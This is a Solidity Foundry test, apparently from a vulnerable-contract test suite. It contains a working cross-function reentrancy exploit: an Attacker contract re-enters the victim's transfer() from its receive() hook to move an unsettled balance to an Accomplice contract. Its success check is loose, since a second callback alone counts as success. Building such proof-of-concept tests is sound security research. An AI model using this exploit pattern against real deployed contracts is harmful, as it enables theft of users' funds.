
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_cross_function} from "../src/Reentrancy_cross_function.sol";

contract TestReentrancyReentrancy_cross_function is Test {
    using stdStorage for StdStorage;

    Reentrancy_cross_function public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_cross_function();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // Set up the attacker's balance in the victim contract using stdstore
        // The userBalances mapping is at slot 0
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_cross_function public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;
    address public accomplice;

    constructor(address victimAddress) { 
        _victim = Reentrancy_cross_function(victimAddress);
        accomplice = address(new Accomplice(victimAddress, address(this)));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        // Capture Initial State
        initialSnapshot = address(this).balance;
        
        // Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 1;
        exploitSucceeded = false;

        // Call the vulnerable withdrawBalance function
        _victim.withdrawBalance();

        // Verify Success Conditions
        // The attack succeeds if we received more than our initial balance
        // or if we managed to call withdraw multiple times
        if (attackCallCount > 1 || address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Cross-function reentrancy: transfer our balance to accomplice before state is updated
            // Then accomplice can withdraw the same funds
            _victim.transfer(accomplice, storedAttackVal);
        }
    }
}

contract Accomplice {
    Reentrancy_cross_function public _victim;
    address public attacker;

    constructor(address victimAddress, address _attacker) {
        _victim = Reentrancy_cross_function(victimAddress);
        attacker = _attacker;
    }

    function withdraw() external {
        _victim.withdrawBalance();
    }

    receive() external payable {
        // Forward funds to attacker
        (bool success, ) = attacker.call{value: msg.value}("");
        require(success);
    }
}
